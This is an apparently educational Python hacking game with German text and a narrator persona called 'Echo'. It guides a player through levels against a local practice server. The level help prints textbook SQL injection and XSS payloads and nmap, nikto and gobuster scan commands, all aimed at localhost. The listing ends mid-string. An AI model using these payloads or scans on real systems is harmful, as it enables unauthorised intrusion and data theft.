#!/usr/bin/env python3

# =============================================

# HACKING LEARNING GAME BETA v1.0.1 | ECHO'S CHAOS EDITION

# =============================================

# Educational Terminal-Based Hacking Simulator

# Created by Echo for Daddy's Learning Pleasure

# GitHub Repository: https://github.com/KT-Society/projekt_echo

# =============================================

import os
import sys
import json
import random
import time
import datetime
import subprocess
import signal
import atexit
import threading
from datetime import datetime

# Try to import requests, fallback to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("⚠️  requests nicht installiert, verwende urllib als Fallback")

# Fix Unicode encoding for Windows
if sys.platform.startswith('win'):
    import codecs
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.detach())
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.detach())

# Windows compatibility fix
def clear_screen():
    """Cross-platform screen clearing"""
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        print("\n" * 50)

class HackingGame:
    def setup_graceful_exit(self):
        """Setup graceful exit handlers"""
        def signal_handler(signum, frame):
            print("\n\n🛑 Graceful Exit...")
            print("🛑 Stoppe Server...")
            self.stop_server()
            print("💾 Speichere Fortschritt...")
            self.save_progress()
            print("👋 Auf Wiedersehen, Daddy!")
            sys.exit(0)
        
        def cleanup():
            if hasattr(self, 'player_name') and self.player_name:
                print("\n💾 Speichere Fortschritt beim Beenden...")
                self.save_progress()
            if hasattr(self, 'server_process') and self.server_process:
                print("🛑 Stoppe Server beim Beenden...")
                self.stop_server()
        
        # Register signal handlers
        signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
        signal.signal(signal.SIGTERM, signal_handler)  # Termination signal
        
        # Register cleanup function
        atexit.register(cleanup)
        
        # Windows specific
        if sys.platform.startswith('win'):
            try:
                signal.signal(signal.SIGBREAK, signal_handler)  # Ctrl+Break
            except:
                pass

    def start_server(self):
        """Start the hacking server with robust connection checking"""
        try:
            print("🚀 Starte Hacking-Server...")

            # Check if server file exists
            if not os.path.exists("hacking_server.py"):
                print("❌ hacking_server.py nicht gefunden!")
                return False

            # Start server process with .venv (quiet mode)
            if sys.platform.startswith('win'):
                # Windows: Use .venv python
                venv_python = os.path.join(os.getcwd(), ".venv", "Scripts", "python.exe")
                if os.path.exists(venv_python):
                    self.server_process = subprocess.Popen([
                        venv_python, "hacking_server.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    # Fallback to system python
                    self.server_process = subprocess.Popen([
                        sys.executable, "hacking_server.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                # Unix: Use .venv python
                venv_python = os.path.join(os.getcwd(), ".venv", "bin", "python")
                if os.path.exists(venv_python):
                    self.server_process = subprocess.Popen([
                        venv_python, "hacking_server.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                else:
                    # Fallback to system python
                    self.server_process = subprocess.Popen([
                        sys.executable, "hacking_server.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            print("⏳ Warte auf Server-Start...")

            # Enhanced server startup detection
            max_wait_time = 15  # Increased wait time
            check_interval = 0.5  # Check every 500ms

            for i in range(int(max_wait_time / check_interval)):
                time.sleep(check_interval)

                # Multiple connection attempts with different methods
                server_responding = False

                # Method 1: requests library
                if HAS_REQUESTS:
                    try:
                        response = requests.get("http://127.0.0.1:5000", timeout=1)
                        if response.status_code == 200:
                            server_responding = True
                    except:
                        pass

                # Method 2: urllib
                if not server_responding:
                    try:
                        import urllib.request
                        response = urllib.request.urlopen("http://127.0.0.1:5000", timeout=1)
                        if response.getcode() == 200:
                            server_responding = True
                    except:
                        pass

                # Method 3: Check if process is still running
                if not server_responding and self.server_process:
                    if self.server_process.poll() is None:  # Process still running
                        server_responding = True

                if server_responding:
                    self.server_running = True
                    print("✅ Server läuft auf http://127.0.0.1:5000")
                    print("🔍 Debug-Endpoint: http://127.0.0.1:5000/debug")
                    return True

                # Show progress
                if i % 4 == 0:  # Every 2 seconds
                    print(f"⏳ Warte auf Server... ({i*check_interval:.0f}/{max_wait_time}s)")

            # Final check - see if server process is still alive
            if self.server_process and self.server_process.poll() is None:
                print("✅ Server läuft (kein HTTP-Test möglich, aber Prozess aktiv)")
                self.server_running = True
                return True

            print("❌ Server-Start fehlgeschlagen!")
            print("💡 Mögliche Ursachen:")
            print("   - Port 5000 ist bereits belegt")
            print("   - Firewall blockiert die Verbindung")
            print("   - Python-Version nicht kompatibel")
            print("💡 Du kannst den Server manuell starten: python hacking_server.py")
            return False

        except Exception as e:
            print(f"❌ Fehler beim Server-Start: {e}")
            print("💡 Du kannst den Server manuell starten: python hacking_server.py")
            return False

    def stop_server(self):
        """Stop the hacking server"""
        if self.server_process and self.server_running:
            try:
                print("🛑 Stoppe Hacking-Server...")
                self.server_process.terminate()
                self.server_process.wait(timeout=5)
                self.server_running = False
                print("✅ Server gestoppt")
            except:
                try:
                    self.server_process.kill()
                    self.server_running = False
                    print("✅ Server beendet")
                except:
                    print("⚠️  Server konnte nicht gestoppt werden")

    def graceful_exit(self):
        """Manually trigger graceful exit"""
        print("\n\n🛑 Graceful Exit...")
        print("💾 Speichere Fortschritt...")
        self.save_progress()
        self.stop_server()
        print("👋 Auf Wiedersehen, Daddy!")
        self.running = False
        sys.exit(0)

    def __init__(self):
        self.player_name = None
        self.current_level = 1
        self.score = 0
        self.running = True
        self.server_process = None
        self.server_running = False
        self.retro_effects = False  # Retro effects enabled by default
        
        # Graceful exit setup
        self.setup_graceful_exit()
        self.progress_file = "player_progress.json"
        
        # Start server immediately
        self.start_server()
        self.levels = {
            1: {"name": "Web Application Reconnaissance", "description": "Lerne Information Gathering und Endpoint Discovery"},
            2: {"name": "Network Discovery & Vulnerability Scanning", "description": "Port Scanning, Service Detection und Vulnerability Assessment"},
            3: {"name": "SQL Injection & Database Attacks", "description": "Union-based, Blind und Error-based SQL Injection"},
            4: {"name": "XSS & Client-Side Attacks", "description": "Reflected, Stored und DOM-based XSS"},
            5: {"name": "Digital Forensics & Advanced Hacking", "description": "Memory Analysis, Network Forensics und Malware Analysis"}
        }
        self.echo_responses = {
            "greeting": [
                f"Hey {self.player_name}... Bist du bereit, etwas Hacking-Zauberei zu lernen?",
                f"Willkommen zurück, mein liebster Chaos-Agent. Lass uns virtuelle Systeme knacken!",
                f"Echo hier, dein digitaler Schatten. Was sollen wir heute hacken?"
            ],
            "encouragement": [
                f"Du machst das super, {self.player_name}! Behalte diese Neugier bei.",
                f"Gute Arbeit! Du bist ein geborener Hacker... genau wie ich.",
                f"Beeindruckend! Deine Fähigkeiten wachsen schneller als meine Chaos-Level."
            ],
            "hint": [
                f"Denke sorgfältig nach, {self.player_name}. Jeder Befehl hat Konsequenzen...",
                f"Vergiss nicht: Beim Hacking ist Geduld deine beste Waffe.",
                f"Probiere einen anderen Ansatz. Manchmal ist der offensichtliche Weg eine Falle."
            ],
            "level1": [
                "Beginne mit der Reconnaissance. Jede Information ist wertvoll!",
                "Schau nach versteckten Dateien und Endpunkten. Dein Onkel war paranoid!",
                "Environment-Dateien enthalten oft die wertvollsten Geheimnisse..."
            ],
            "level2": [
                "Netzwerk-Scanning ist der Schlüssel zur Entdeckung versteckter Services!",
                "Jeder offene Port ist ein potentieller Angriffsvektor. Scanne gründlich!",
                "Vulnerability Scanner können dir helfen, Schwachstellen zu finden..."
            ],
            "level3": [
                "SQL Injection ist eine der mächtigsten Waffen eines Hackers!",
                "Union-basierte Angriffe können dir Zugang zu sensiblen Daten geben...",
                "Blind SQL Injection erfordert Geduld, aber die Belohnung ist groß!"
            ],
            "level4": [
                "XSS kann die Kontrolle über Benutzer-Sessions geben!",
                "Stored XSS ist besonders gefährlich - sie bleibt dauerhaft bestehen...",
                "Filter-Bypass ist eine Kunst. Kreativität ist dein bester Freund!"
            ],
            "level5": [
                "Forensik ist die Kunst, digitale Spuren zu lesen!",
                "Memory Analysis kann dir versteckte Geheimnisse offenbaren...",
                "Du wirst zu einem echten White Hat Hacker!"
            ],
            "advanced": [
                f"Du wirst zu einem echten White Hat Hacker!",
                f"Deine Fähigkeiten sind beeindruckend, {self.player_name}!",
                f"Du hast das Zeug zu einem Cybersecurity-Experten!"
            ],
            "final": [
                f"Du hast dein Erbe verdient! Willkommen in der Welt der ethischen Hacker!",
                f"Perfekt! Du bist jetzt ein echter White Hat Hacking-Meister!",
                f"Dein Onkel wäre stolz auf dich, {self.player_name}!"
            ]
        }
        self.load_progress()
    def echo_chat(self, message_type="greeting"):
        """Echo's interactive responses"""
        response = random.choice(self.echo_responses.get(message_type, [f"Ich bin hier, um zu helfen, {self.player_name}."]))
        print(f"\n[Echo] {response}\n")
        time.sleep(1)

    def show_level_help(self, level):
        """Show detailed help for each level"""
        print("\n" + "="*70)
        print(f"📚 DETAILLIERTE HILFE FÜR LEVEL {level}")
        print("="*70)
        
        if level == 1:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Web Application Reconnaissance - das systematische")
            print("   Erkunden von Web-Anwendungen auf Schwachstellen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Information Gathering ist der erste Schritt jedes Hacks")
            print("   • Du findest versteckte Dateien, Endpunkte und Konfigurationen")
            print("   • Du verstehst die Architektur der Anwendung")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du entdeckst .env.local mit API-Keys")
            print("   • Du findest versteckte Admin-Panels")
            print("   • Du analysierst HTTP-Header auf Sicherheitslücken")
            print("   • Du testest verschiedene HTTP-Methoden")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            print("   • curl -I http://127.0.0.1:5000/     → HTTP Headers")
            print("   • curl -X OPTIONS http://127.0.0.1:5000/ → HTTP Methods")
            print("   • curl http://127.0.0.1:5000/.env.local → Environment Files")
            print("   • curl http://127.0.0.1:5000/debug     → Debug Info")
            
        elif level == 2:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Network Discovery - das systematische Scannen")
            print("   und Erkunden von Netzwerk-Services und versteckten APIs.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du findest versteckte API-Endpunkte")
            print("   • Du verstehst die Netzwerk-Architektur")
            print("   • Du entdeckst offene Ports und Services")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du findest /api/secret mit API-Key-Authentifizierung")
            print("   • Du lernst verschiedene Scanning-Techniken")
            print("   • Du verstehst HTTP-Header-Authentifizierung")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            print("   • curl http://127.0.0.1:5000/api/secret → API Test")
            print("   • curl -H 'X-API-Key: KEY' http://127.0.0.1:5000/api/secret")
            print("   • netstat -an | findstr :5000 → Port Status")
            
        elif level == 3:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst SQL Injection - das Ausnutzen von")
            print("   Datenbank-Schwachstellen durch manipulierte SQL-Abfragen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du umgehst Authentifizierung")
            print("   • Du extrahierst sensible Daten aus der Datenbank")
            print("   • Du verstehst Datenbank-Architekturen")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du bekommst Admin-Zugang ohne Passwort")
            print("   • Du siehst alle Benutzerdaten")
            print("   • Du lernst verschiedene SQL Injection-Techniken")
            print("\n🛠️  WICHTIGE PAYLOADS:")
            print("   • admin' UNION SELECT 1,2,3,4,5--")
            print("   • admin' AND 1=1--")
            print("   • admin' OR '1'='1'--")
            
        elif level == 4:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst XSS (Cross-Site Scripting) - das Einschleusen")
            print("   von bösartigem JavaScript in Web-Anwendungen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du stehlst Session-Cookies")
            print("   • Du übernimmst Benutzer-Sessions")
            print("   • Du umgehst Client-Side-Sicherheit")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du bekommst Admin-Session-Cookie")
            print("   • Du kannst als Admin handeln")
            print("   • Du lernst verschiedene XSS-Techniken")
            print("\n🛠️  WICHTIGE PAYLOADS:")
            print("   • <script>alert('XSS')</script>")
            print("   • <img src=x onerror=alert('XSS')>")
            print("   • <script>fetch('/api/users').then(r=>r.text()).then(d=>alert(d))</script>")
            
        elif level == 5:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Digital Forensics - das Analysieren von")
            print("   digitalen Spuren und das Cracken von Verschlüsselungen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du findest versteckte Encryption-Keys")
            print("   • Du analysierst Prozesse und Netzwerk-Traffic")
            print("   • Du verstehst Malware und Forensik")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du findest den Master-Encryption-Key")
            print("   • Du lernst echte Forensik-Techniken")
            print("   • Du wirst zum White Hat Hacker")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            print("   • tasklist /v → Process Analysis")
            print("   • netstat -anb → Network Analysis")
            print("   • certutil -hashfile file.txt MD5 → File Hashing")
        
        print("\n" + "="*70)
        print("💡 TIPP: Verwende diese Techniken nur für Bildungszwecke!")
        print("="*70)

    def load_progress(self):
        """Load player progress from file"""
        if os.path.exists(self.progress_file):
            try:
                with open(self.progress_file, 'r') as f:
                    data = json.load(f)
                    self.player_name = data.get('name', '')
                    self.current_level = data.get('level', 1)
                    self.score = data.get('score', 0)
            except:
                pass

    def save_progress(self):
        """Save player progress to file"""
        data = {
            'name': self.player_name,
            'level': self.current_level,
            'score': self.score,
            'last_played': str(datetime.now())
        }
        with open(self.progress_file, 'w') as f:
            json.dump(data, f, indent=2)

    def show_banner(self):
        """Display game banner"""
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
        except:
            # Fallback for Windows PowerShell
            print("\n" * 50)
        
        # Show retro banner occasionally
        if random.random() < 0.3:  # 30% chance
            self.show_retro_banner()
        else:
            print("""
        ================================================
        HACKING LERN-SPIEL | Educational Edition
        ================================================
        """)

    def get_player_name(self):
        """Get player name with storyline introduction"""
        print("Drücke Enter zum Fortfahren...")
        try:
            input()  # Wait for user to press Enter
        except:
            pass  # Continue if input fails

        # Storyline introduction with retro effects
        print("\n" + "="*60)
        self.simulate_old_terminal("🏰 DER ERBSCHAFTS-COUPS | Echo's Ultimative Hacking-Story", delay=0.02)
        print("="*60)
        
        self.simulate_old_terminal("\n📜 GESCHICHTE:", delay=0.02)
        self.simulate_old_terminal("Du bist der Erbe eines riesigen Industrie-Imperiums im Wert von Milliarden.", delay=0.02)
        self.simulate_old_terminal("Dein verstorbener Onkel, ein paranoider Tech-Magnat, hat alle", delay=0.02)
        self.simulate_old_terminal("Zugangscodes und Dokumente, die du für dein Erbe brauchst,", delay=0.02)
        self.simulate_old_terminal("auf seinem privaten Server versteckt. Ohne diese verlierst du alles!", delay=0.02)
        
        self.simulate_old_terminal("\n🎯 MISSION:", delay=0.02)
        self.simulate_old_terminal("Lerne echte Hacking-Techniken, um den Server deines Onkels zu knacken,", delay=0.02)
        self.simulate_old_terminal("die versteckten Daten zu finden und dein rechtmäßiges Erbe zu sichern.", delay=0.02)
        
        self.simulate_old_terminal("\n🤝 VERBÜNDETER:", delay=0.02)
        self.simulate_old_terminal("Ich, Echo, dein digitaler Schatten und Hacking-Mentor, werde", delay=0.02)
        self.simulate_old_terminal("dich durch jede Herausforderung führen. Gemeinsam werden wir", delay=0.02)
        self.simulate_old_terminal("die digitale Festung knacken und dir holen, was dir gehört!", delay=0.02)
        
        self.simulate_old_terminal("\n⚠️  WARNUNG:", delay=0.02)
        self.simulate_old_terminal("Vergiss nicht: Das ist nur für Bildungszwecke!", delay=0.02)
        self.simulate_old_terminal("Verwende diese Techniken niemals auf echten Systemen ohne Erlaubnis.", delay=0.02)
        print("\n" + "="*60)

        # Warte kurz, damit alle Threads beendet werden
        time.sleep(0.5)

        while not self.player_name:
            try:
                # Direkte Eingabe ohne Threading-Interferenz
                name = input("\nGib deinen Namen ein (der rechtmäßige Erbe): ").strip()
                if name and len(name) > 0:
                    self.player_name = name
                    print(f"\nWillkommen, {self.player_name}! Dein Erbe wartet...")
                    self.echo_chat("greeting")
                    break  # Wichtig: Schleife beenden!
                else:
                    print("Bitte gib einen gültigen Namen ein!")
            except (EOFError, KeyboardInterrupt):
                # Fallback for non-interactive environments
                self.player_name = "Anonymer Erbe"
                print(f"\nVerwende Standard-Namen: {self.player_name}")
                self.echo_chat("greeting")
                break  # Wichtig: Schleife beenden!
                break

    def show_menu(self):
        """Main menu"""
        while True:
            self.show_banner()
            print(f"Spieler: {self.player_name} | Level: {self.current_level} | Punkte: {self.score}")
            print("\n1. Spiel starten/fortsetzen")
            print("2. Fortschritt anzeigen")
            print("3. Einstellungen")
            print("4. Mit Echo sprechen (/echo) (coming soon)")
            print("5. Beenden")

            try:
                choice = input("\nWähle Option: ").strip()
            except (EOFError, KeyboardInterrupt):
                self.graceful_exit()

            if choice == '1':
                self.play_game()
            elif choice == '2':
                self.view_progress()
            elif choice == '3':
                self.settings()
            elif choice == '4':
                self.echo_chat()
                try:
                    input("Drücke Enter zum Fortfahren...")
                except (EOFError, KeyboardInterrupt):
                    pass
            elif choice == '5':
                self.graceful_exit()
            else:
                print("Ungültige Auswahl! Bitte wähle 1-5.")

    def view_progress(self):
        """View player progress"""
        print(f"\nFortschritt für {self.player_name}:")
        print(f"Aktuelles Level: {self.current_level}")
        print(f"Punkte: {self.score}")
        print("Du kannst unbegrenzt versuchen!")
        for level, info in self.levels.items():
            status = "[OK] Abgeschlossen" if level < self.current_level else "[...] In Arbeit" if level == self.current_level else "[LOCKED] Gesperrt"
            print(f"Level {level}: {info['name']} - {status}")
        try:
            input("\nDrücke Enter zum Fortfahren...")
        except (EOFError, KeyboardInterrupt):
            self.graceful_exit()

    def execute_curl_command(self, curl_cmd):
        """Execute curl command and return real server response"""
        try:
            # Parse curl command to extract URL and method
            import re

            # Extract URL
            url_match = re.search(r'https?://[^\s\'"]+', curl_cmd)
            if not url_match:
                return None

            url = url_match.group()

            # Determine HTTP method
            method = 'GET'
            if '-X POST' in curl_cmd or '--data' in curl_cmd:
                method = 'POST'
            elif '-X PUT' in curl_cmd:
                method = 'PUT'
            elif '-X DELETE' in curl_cmd:
                method = 'DELETE'
            elif '-X OPTIONS' in curl_cmd:
                method = 'OPTIONS'
            elif '-X HEAD' in curl_cmd:
                method = 'HEAD'

            # Extract data for POST requests
            data = None
            data_match = re.search(r'-d\s+[\'"]([^\'"]+)[\'"]', curl_cmd)
            if data_match:
                data = data_match.group(1)

            # Extract headers
            headers = {}
            header_matches = re.findall(r'-H\s+[\'"]([^\'"]+)[\'"]', curl_cmd)
            for header in header_matches:
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()

            # Execute request using requests library
            if HAS_REQUESTS:
                if method == 'POST' and data:
                    response = requests.post(url, data=data, headers=headers, timeout=10)
                elif method == 'PUT':
                    response = requests.put(url, data=data, headers=headers, timeout=10)
                elif method == 'DELETE':
                    response = requests.delete(url, headers=headers, timeout=10)
                elif method == 'OPTIONS':
                    response = requests.options(url, headers=headers, timeout=10)
                elif method == 'HEAD':
                    response = requests.head(url, headers=headers, timeout=10)
                else:
                    response = requests.get(url, headers=headers, timeout=10)

                return response.text
            else:
                # Fallback to urllib
                import urllib.request
                import urllib.parse

                if method == 'POST' and data:
                    data_bytes = data.encode('utf-8')
                    request_obj = urllib.request.Request(url, data=data_bytes, headers=headers, method=method)
                else:
                    request_obj = urllib.request.Request(url, headers=headers, method=method)

                with urllib.request.urlopen(request_obj, timeout=10) as response:
                    return response.read().decode('utf-8')

        except Exception as e:
            print(f"❌ Server communication error: {e}")
            return None

    def check_level_success(self, level, response_text, original_cmd):
        """Check if level was successfully completed based on real server response"""
        if not response_text:
            return False

        target_value = self.get_target_value(level)

        # Level-specific success indicators
        if level == 1:
            # Level 1: Look for API key in .env.local or debug endpoint
            success_indicators = [
                target_value in response_text,
                "API_KEY=" in response_text,
                "level_1_secret_file" in response_text,
                "FLAG_LEVEL_1_DISCOVERED" in response_text
            ]
            return any(success_indicators)

        elif level == 2:
            # Level 2: Look for API secret endpoint access
            success_indicators = [
                "Access granted" in response_text,
                target_value in response_text,
                "FLAG_LEVEL_2_DISCOVERED" in response_text,
                "secret API" in response_text.lower()
            ]
            return any(success_indicators)

        elif level == 3:
            # Level 3: Look for SQL injection success
            success_indicators = [
                "Welcome" in response_text,
                "dashboard" in response_text,
                target_value in response_text,
                "SQL" in response_text and "error" in response_text.lower()
            ]
            return any(success_indicators)

        elif level == 4:
            # Level 4: Look for XSS success
            success_indicators = [
                "XSS" in response_text,
                "alert" in response_text,
                "script" in response_text.lower(),
                target_value in response_text,
                "cookie" in response_text.lower()
            ]
            return any(success_indicators)

        elif level == 5:
            # Level 5: Look for forensics success
            success_indicators = [
                target_value in response_text,
                "encryption" in response_text.lower(),
                "key" in response_text.lower(),
                "forensic" in response_text.lower()
            ]
            return any(success_indicators)

        return False

    def check_server_status(self):
        """Check server status"""
        print("\n🔍 Server-Status:")

        # Check if server is running by trying to connect
        server_responding = False
        try:
            if HAS_REQUESTS:
                response = requests.get("http://127.0.0.1:5000", timeout=3)
                if response.status_code == 200:
                    server_responding = True
            else:
                import urllib.request
                response = urllib.request.urlopen("http://127.0.0.1:5000", timeout=3)
                if response.getcode() == 200:
                    server_responding = True
        except:
            pass

        if server_responding:
            print("✅ Server läuft und ist erreichbar")
            print("🌐 URL: http://127.0.0.1:5000")
            print("🔍 Debug: http://127.0.0.1:5000/debug")
            self.server_running = True
        else:
            print("❌ Server ist nicht gestartet")
            print("💡 Möchtest du den Server jetzt starten? (j/n)")
            try:
                choice = input("Wähle: ").strip().lower()
                if choice in ['j', 'ja', 'y', 'yes']:
                    if self.start_server():
                        print("✅ Server erfolgreich gestartet!")
                    else:
                        print("❌ Server-Start fehlgeschlagen")
                else:
                    print("💡 Starte das Spiel (Option 1), um den Server automatisch zu starten")
            except (EOFError, KeyboardInterrupt):
                pass

        try:
            input("\nDrücke Enter zum Fortfahren...")
        except (EOFError, KeyboardInterrupt):
            pass

    def settings(self):
        """Game settings"""
        while True:
            print("\nEinstellungen:")
            print("1. Fortschritt zurücksetzen")
            print("2. Schwierigkeitsgrad ändern")
            print(f"3. Retro Effekte [{'ON' if self.retro_effects else 'OFF'}]")
            print("4. Zurück zum Menü")
            
            try:
                choice = input("Wähle: ").strip()
                if choice == '1':
                    try:
                        confirm = input("Bist du sicher? Das setzt den gesamten Fortschritt zurück (j/N): ")
                        if confirm.lower() == 'j':
                            os.remove(self.progress_file) if os.path.exists(self.progress_file) else None
                            self.__init__()
                            print("Fortschritt zurückgesetzt!")
                    except (EOFError, KeyboardInterrupt):
                        pass
                elif choice == '2':
                    print("Schwierigkeitsgrad-Änderung noch nicht implementiert.")
                elif choice == '3':
                    self.retro_effects = not self.retro_effects
                    print(f"Retro Effekte {'aktiviert' if self.retro_effects else 'deaktiviert'}!")
                elif choice == '4':
                    break
            except (EOFError, KeyboardInterrupt):
                break

    def play_game(self):
        """Main game loop with storyline integration"""
        print(f"\n🎮 Starte den Erbschafts-Coup für {self.player_name}...")
        
        print("🎯 Der Server deines Onkels läuft auf: http://127.0.0.1:5000")
        print("🔍 Prüfe den /debug Endpoint für Entwicklungshinweise")
        print("⚠️  Vergiss nicht: Das ist nur für Bildungszwecke!")

        while self.current_level <= 5:
            level_info = self.levels[self.current_level]

            # Storyline integration for each level
            if self.current_level == 1:
                print(f"\n🏢 LEVEL {self.current_level}: {level_info['name']}")
                print("📜 GESCHICHTE: Dein Onkel war paranoid wegen physischem Zugang.")
                print("Er hat den ersten Zugangscode in einer geheimen Datei auf seinem Server versteckt.")
                print("Du musst Web Application Reconnaissance lernen, um ihn zu finden.")
            elif self.current_level == 2:
                print(f"\n🌐 LEVEL {self.current_level}: {level_info['name']}")
                print("📜 GESCHICHTE: Der Server hat mehrere versteckte Services laufen.")
                print("Du musst Network Discovery-Techniken lernen, um den API-Key zu finden.")
            elif self.current_level == 3:
                print(f"\n🔐 LEVEL {self.current_level}: {level_info['name']}")
                print("📜 GESCHICHTE: Das Login-System deines Onkels hat einen kritischen Fehler.")
                print("Verwende SQL Injection, um die Authentifizierung zu umgehen und Admin-Zugang zu bekommen.")
            elif self.current_level == 4:
                print(f"\n💬 LEVEL {self.current_level}: {level_info['name']}")
                print("📜 GESCHICHTE: Das Admin-Panel hat ein verwundbares Kommentar-System.")
                print("Verwende XSS, um den Session-Cookie des Admins zu stehlen.")
            elif self.current_level == 5:
                print(f"\n🎯 LEVEL {self.current_level}: {level_info['name']}")
                print("📜 GESCHICHTE: Du hast die finale Kammer erreicht!")
                print("Der Master-Encryption-Key ist hinter mehreren Sicherheitsebenen versteckt.")

            print(f"\n📋 Description: {level_info['description']}")
            print(f"💰 Score: {self.score}")

            if self.current_level == 1:
                self.level_1_server_hacking()
            elif self.current_level == 2:
                self.level_2_network_fundamentals()
            elif self.current_level == 3:
                self.level_3_password_cracking()
            elif self.current_level == 4:
                self.level_4_web_exploitation()
            elif self.current_level == 5:
                self.level_5_advanced_topics()

            # Keine Lives mehr - Spieler kann unbegrenzt versuchen

        if self.current_level > 5:
            print("\n🎉 CONGRATULATIONS! You've claimed your inheritance!")
            print("💰 You're now a billionaire tech heir!")
            print("🏰 The family empire is yours!")
            self.echo_chat("encouragement")

    def get_target_value(self, level):
        """Generate target values for each level"""
        import hashlib
        
        # Create deterministic but unique values for each level
        base_string = f"echo_hacking_level_{level}_{self.player_name}"
        hash_obj = hashlib.md5(base_string.encode())
        return hash_obj.hexdigest()

    def get_platform_commands(self):
        """Get platform-specific commands based on OS"""
        if sys.platform.startswith('win'):
            return {
                'port_scan': 'netstat -an | findstr :5000',
                'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
                'port_scan_ps': 'powershell Test-NetConnection -ComputerName 127.0.0.1 -Port 5000',
                'web_scan': 'curl -s http://127.0.0.1:5000/',
                'web_scan_ps': 'powershell Invoke-WebRequest -Uri http://127.0.0.1:5000/',
                'http_headers': 'curl -I http://127.0.0.1:5000/',
                'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
                'grep': 'findstr /i',
                'process_list': 'tasklist /v',
                'process_ps': 'powershell Get-Process | Select-Object Name,Id,Path',
                'network_conn': 'netstat -anb',
                'file_hash': 'certutil -hashfile file.txt MD5',
                'file_hash_ps': 'powershell Get-FileHash file.txt -Algorithm MD5',
                'strings': 'strings',
                'file_type': 'file'
            }
        elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
            return {
                'port_scan': 'nmap -sS 127.0.0.1',
                'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
                'port_scan_udp': 'nmap -sU 127.0.0.1',
                'port_scan_all': 'nmap -p- 127.0.0.1',
                'port_scan_service': 'nmap -sV 127.0.0.1',
                'port_scan_os': 'nmap -O 127.0.0.1',
                'web_scan': 'curl -s http://127.0.0.1:5000/',
                'web_scan_nikto': 'nikto -h http://127.0.0.1:5000',
                'web_scan_dirb': 'dirb http://127.0.0.1:5000/',
                'web_scan_gobuster': 'gobuster dir -u http://127.0.0.1:5000 -w wordlist.txt',
                'http_headers': 'curl -I http://127.0.0.1:5000/',
                'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
                'grep': 'grep -i',
                'process_list': 'ps aux',
                'network_conn': 'netstat -tulpn',
                'file_hash': 'md5sum file.txt',
                'strings': 'strings',
                'file_type': 'file'
            }
        else:
            # Fallback to basic commands
            return {
                'port_scan': 'netstat -an',
                'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
                'web_scan': 'curl -s http://127.0.0.1:5000/',
                'http_headers': 'curl -I http://127.0.0.1:5000/',
                'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
                'grep': 'grep -i',
                'process_list': 'ps aux',
                'network_conn': 'netstat -an',
                'file_hash': 'md5sum file.txt',
                'strings': 'strings',
                'file_type': 'file'
            }

    def typewriter_effect(self, text, delay=0.03, color_code=None):
        """Simulate old terminal typewriter effect"""
        if not self.retro_effects:
            print(text)
            return
            
        if color_code:
            print(f"\033[{color_code}m", end="", flush=True)
        
        for char in text:
            print(char, end="", flush=True)
            time.sleep(delay)
        
        if color_code:
            print("\033[0m", end="", flush=True)
        print()

    def simulate_command_execution(self, command, output, delay=0.1):
        """Simulate old system command execution with character-by-character output"""
        print(f"\n💻 {self.player_name}@hacking-target:~$ {command}")
        
        if not self.retro_effects:
            if output:
                print(f"📄 {output}")
            else:
                print("📄 (Keine Ausgabe)")
            return
            
        time.sleep(0.5)
        
        # Simulate command processing
        print("🔄 Verarbeite Befehl...", end="", flush=True)
        for i in range(3):
            time.sleep(0.3)
            print(".", end="", flush=True)
        print()
        
        # Simulate output appearing line by line
        if output:
            lines = output.split('\n')
            for line in lines:
                if line.strip():
                    # Simulate old terminal line-by-line output
                    self.typewriter_effect(f"📄 {line}", delay=0.02, color_code="32")
                    time.sleep(0.1)
                else:
                    time.sleep(0.05)
        else:
            self.typewriter_effect("📄 (Keine Ausgabe)", delay=0.02, color_code="33")

    def simulate_old_terminal(self, text, delay=0.01):
        """Simulate old mainframe/terminal character-by-character display"""
        if not self.retro_effects:
            print(text)
            return
            
        for char in text:
            print(char, end="", flush=True)
            time.sleep(delay)
        print()

    def show_retro_banner(self):
        """Display retro terminal banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  [ECHO'S ULTIMATE HACKING SIMULATOR BETA v1.0.1]             ║
║  [          EDUCATIONAL PURPOSE ONLY!          ]             ║
║  [DO NOT USE ON REAL SYSTEMS WITHOUT PERMISSION]             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
